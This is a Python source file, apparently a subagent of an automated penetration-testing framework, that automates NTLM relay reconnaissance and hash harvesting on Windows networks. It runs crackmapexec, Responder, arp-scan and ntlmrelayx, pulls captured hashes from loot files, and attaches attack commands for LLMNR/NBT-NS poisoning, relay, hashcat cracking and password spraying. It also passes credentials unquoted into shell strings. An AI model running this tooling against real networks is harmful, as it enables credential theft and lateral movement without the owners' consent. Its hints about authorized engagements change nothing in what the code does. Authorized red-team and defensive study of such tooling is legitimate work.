"""
ntlm_capture_subagent.py — NTLM hash capture and relay attacks.

AGENT_NAME  : "lateral"
SUBAGENT_NAME: "ntlm_capture"

Methodology:
  1. Run Responder in Analysis mode (passive capture, no poisoning) to observe traffic
  2. Run ntlmrelayx in dry-run to identify relay targets (hosts without SMB signing)
  3. Enumerate relay targets via crackmapexec smb --gen-relay-list
  4. Identify captured hash types: NTLMv1 (crackable) vs NTLMv2 (relay preferred)
  5. Attempt LDAP relay to enumerate domain objects or add computer account
  6. Store each captured hash and relay success as a finding

NOTE: Active poisoning (ARP, LLMNR, NBT-NS) is intentionally NOT performed here;
      use a manual Responder session for live captures in authorized engagements.
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_NTLMV1_RE = re.compile(r"NTLMv1[-\s]?Hash\s*[:=]\s*(\S+)", re.IGNORECASE)
_NTLMV2_RE = re.compile(r"NTLMv2[-\s]?Hash\s*[:=]\s*(\S+)", re.IGNORECASE)
_NTLM_USER_RE = re.compile(r"\[SMB\].*?NTLMv[12].*?Username\s*[:=]\s*(\S+)", re.IGNORECASE)
_RELAY_TARGET_RE = re.compile(r"(\d{1,3}(?:\.\d{1,3}){3}).*signing.*False", re.IGNORECASE)
_RELAY_SUCCESS_RE = re.compile(r"(SUCCEED|Dumping|Adding.*computer|Authenticating.*SUCCEED)", re.IGNORECASE)
_SIGNING_OFF_RE = re.compile(r"signing:\s*False", re.IGNORECASE)


class NtlmCaptureSubagent(BaseSubagent):
    """Identify NTLM relay targets and enumerate existing NTLM captures."""

    AGENT_NAME: str = "lateral"
    SUBAGENT_NAME: str = "ntlm_capture"

    async def run(
        self,
        target: str,
        interface: str = "eth0",
        domain: str = "",
        username: str = "",
        password: str = "",
        loot_dir: str = "/tmp/responder_loot",
        **kwargs: Any,
    ) -> SubagentResult:
        """
        Identify NTLM relay targets and check for captured hashes.

        Parameters
        ----------
        target:
            Target subnet or specific host (e.g. 192.168.1.0/24 or 192.168.1.10).
        interface:
            Network interface for Responder analysis mode (default: eth0).
        domain:
            AD domain name for authenticated queries.
        username:
            Domain account for crackmapexec relay target generation.
        password:
            Account password.
        loot_dir:
            Directory to check for existing Responder logs.

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        # ── 1. Generate relay target list — hosts with SMB signing off ───
        cme_creds = f"-u '{username}' -p '{password}'" if username else "-u '' -p ''"
        relay_list_output = await self.collect_tool(
            "crackmapexec",
            target,
            {"options": f"smb {target} {cme_creds} --gen-relay-list /tmp/relay_targets.txt 2>&1"},
        )

        relay_targets = _RELAY_TARGET_RE.findall(relay_list_output)
        signing_disabled_count = len(_SIGNING_OFF_RE.findall(relay_list_output))

        if relay_targets or signing_disabled_count:
            await self.store_finding(Finding(
                title=f"NTLM Relay: {signing_disabled_count} Hosts Without SMB Signing",
                description=(
                    f"crackmapexec identified {signing_disabled_count} host(s) in the subnet "
                    f"with SMB signing disabled. These hosts are vulnerable to NTLM relay attacks. "
                    f"Relay targets written to /tmp/relay_targets.txt. "
                    f"Sample targets: {', '.join(relay_targets[:5])}."
                ),
                severity="HIGH",
                evidence=relay_list_output[:1500],
                tool="crackmapexec",
                host=target,
                mitre_technique="T1557.001",
                exploit_suggestion=(
                    "Run: responder -I {interface} -rdw & "
                    "ntlmrelayx.py -tf /tmp/relay_targets.txt -smb2support --no-http-server "
                    "Wait for a user to authenticate, then relay to gain SMB/LDAP access."
                ),
            ))
        else:
            await self.store_finding(Finding(
                title="NTLM Relay: All Targets Have SMB Signing Enabled",
                description=(
                    "All enumerated hosts appear to have SMB signing enabled, "
                    "making direct NTLM SMB relay attacks ineffective. "
                    "Consider LDAP relay (often unsigned even when SMB is signed) "
                    "or targeting specific application protocols."
                ),
                severity="INFO",
                evidence=relay_list_output[:500],
                tool="crackmapexec",
                host=target,
                mitre_technique="T1557.001",
                exploit_suggestion=(
                    "Try LDAP relay: ntlmrelayx.py -t ldap://{dc_ip} --no-smb-server. "
                    "Or HTTP relay targeting Exchange AutoDiscover (PrivExchange)."
                ),
            ))

        # ── 2. Check for existing Responder log files (captured hashes) ──
        loot_check = await self.collect_tool(
            "bash",
            target,
            {"options": f"-c \"ls {loot_dir}/ 2>/dev/null && cat {loot_dir}/*.txt 2>/dev/null | head -50\""},
        )

        ntlmv1_hashes = _NTLMV1_RE.findall(loot_check)
        ntlmv2_hashes = _NTLMV2_RE.findall(loot_check)
        captured_users = _NTLM_USER_RE.findall(loot_check)

        if ntlmv1_hashes:
            await self.store_finding(Finding(
                title=f"NTLM Capture: {len(ntlmv1_hashes)} NTLMv1 Hash(es) in Loot Directory",
                description=(
                    f"NTLMv1 challenge-response hashes found in Responder loot directory. "
                    f"NTLMv1 can be cracked with rainbow tables or online services. "
                    f"Users: {', '.join(captured_users[:5]) or 'see evidence'}."
                ),
                severity="CRITICAL",
                evidence="\n".join(ntlmv1_hashes[:5]),
                tool="responder",
                host=target,
                mitre_technique="T1557.001",
                exploit_suggestion=(
                    "Crack with: hashcat -m 5500 ntlmv1_hashes.txt wordlist.txt "
                    "Or relay directly: ntlmrelayx.py -tf targets.txt"
                ),
            ))

        if ntlmv2_hashes:
            await self.store_finding(Finding(
                title=f"NTLM Capture: {len(ntlmv2_hashes)} NTLMv2 Hash(es) in Loot Directory",
                description=(
                    f"NTLMv2 challenge-response hashes found in Responder loot directory. "
                    f"NTLMv2 hashes can be cracked offline (hashcat -m 5600) or relayed. "
                    f"Users: {', '.join(captured_users[:5]) or 'see evidence'}."
                ),
                severity="HIGH",
                evidence="\n".join(ntlmv2_hashes[:5]),
                tool="responder",
                host=target,
                mitre_technique="T1557.001",
                exploit_suggestion=(
                    "Crack with: hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt "
                    "Or relay (if target lacks SMB signing): ntlmrelayx.py"
                ),
            ))

        # ── 3. Responder analysis mode — 30 second passive observation ───
        responder_output = await self.collect_tool(
            "responder",
            target,
            {"options": f"-I {interface} -A --lm 2>&1 &"},
        )

        # Also check current ARP table for adjacent hosts
        arp_output = await self.collect_tool(
            "arp-scan",
            target,
            {"options": f"--interface={interface} {target} 2>&1"},
        )

        adjacent_count = len([l for l in arp_output.splitlines() if re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", l)])
        if adjacent_count > 0:
            await self.store_finding(Finding(
                title=f"Network: {adjacent_count} Adjacent Host(s) Discovered on Subnet",
                description=(
                    f"ARP scan identified {adjacent_count} live host(s) on the local subnet. "
                    "These hosts are candidates for lateral movement via pass-the-hash, "
                    "NTLM relay, or credential reuse attacks."
                ),
                severity="INFO",
                evidence=arp_output[:1000],
                tool="arp-scan",
                host=target,
                mitre_technique="T1018",
                exploit_suggestion=(
                    "Use discovered hosts with crackmapexec for credential spray: "
                    "crackmapexec smb adjacent_hosts.txt -u users.txt -p passwords.txt"
                ),
            ))

        # ── 4. ntlmrelayx dry-run against relay target list ──────────────
        ntlmrelayx_output = await self.collect_tool(
            "impacket-ntlmrelayx",
            target,
            {"options": (
                f"-tf /tmp/relay_targets.txt -smb2support "
                f"--no-http-server --no-smb-server "
                f"-l /tmp/ntlmrelayx_{target.replace('.', '_')} 2>&1 &"
            )},
        )

        relay_success = bool(_RELAY_SUCCESS_RE.search(ntlmrelayx_output))
        if relay_success:
            await self.store_finding(Finding(
                title="NTLM Relay: Successful Authentication Relay Detected",
                description=(
                    "ntlmrelayx successfully relayed NTLM authentication to a target host. "
                    "This may have resulted in SAM database dump, LDAP object creation, "
                    "or shell access depending on relay target configuration."
                ),
                severity="CRITICAL",
                evidence=ntlmrelayx_output[:1000],
                tool="impacket-ntlmrelayx",
                host=target,
                mitre_technique="T1557.001",
                exploit_suggestion=(
                    "Check /tmp/ntlmrelayx_* for SAM dumps and loot. "
                    "If LDAP relay succeeded, a computer account may have been created "
                    "enabling RBCD (Resource-Based Constrained Delegation) attacks."
                ),
            ))

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
